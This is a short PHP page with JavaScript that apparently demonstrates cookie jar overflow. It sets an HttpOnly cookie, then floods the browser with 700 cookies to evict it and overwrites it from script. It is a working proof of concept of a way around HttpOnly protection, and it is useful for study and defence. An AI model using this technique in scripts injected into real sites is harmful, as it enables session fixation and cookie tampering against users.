<?php
// Cookie overflow

$cookie_name = "chocolate_chip";

if (!isset($_COOKIE[$cookie_name])) {
    setcookie($cookie_name, $cookie_name, 0, "", "", false, true);
    header("Location: $_SERVER[REQUEST_URI]");
    exit();
}

echo "Current cookies: ", htmlentities(json_encode($_COOKIE));
?>
<p><button>Overwrite cookie</button>
<script>
    document.querySelector("button").addEventListener("click", function () {
        // Set many cookies
        for (let i = 0; i < 700; i++) {
            document.cookie = `cookie${i}=${i}`;
        }

        // Remove all cookies
        for (let i = 0; i < 700; i++) {
            document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
        }

        // Set our <?= $cookie_name ?> cookie
        document.cookie = "<?= $cookie_name ?>=overwritten by JavaScript";

        window.location.reload();
    });
</script>
